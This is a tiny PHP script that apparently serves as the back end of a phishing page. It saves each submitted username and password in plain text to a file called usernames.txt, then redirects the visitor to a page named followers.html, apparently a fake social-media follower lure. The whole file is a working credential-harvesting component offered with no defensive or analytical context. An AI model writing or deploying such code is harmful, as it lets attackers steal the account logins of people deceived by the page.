<?php

file_put_contents("usernames.txt", "2 Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: followers.html');
exit();
